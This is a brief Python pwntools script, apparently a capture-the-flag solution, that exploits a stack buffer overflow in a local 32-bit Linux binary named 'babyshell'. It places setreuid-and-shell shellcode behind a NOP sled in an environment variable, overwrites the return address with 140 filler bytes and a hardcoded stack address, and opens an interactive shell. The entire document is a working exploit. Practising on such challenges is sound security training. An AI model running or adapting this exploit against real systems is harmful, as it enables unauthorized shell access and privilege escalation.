from pwn import *

context.arch = 'i386'
context.os = 'linux'
shellcode = asm(shellcraft.i386.linux.setreuid() + shellcraft.i386.linux.sh())
sh = b'\x90' * (100000 - len(shellcode)) + shellcode
io = process("./babyshell", env={"MYENV": sh})
print(io.recvregex(b'turtle'))
addr = "0xffd9a02c"
addr = p32(int(addr, 16))

io.sendline(b'A'*140 + addr)
io.interactive()
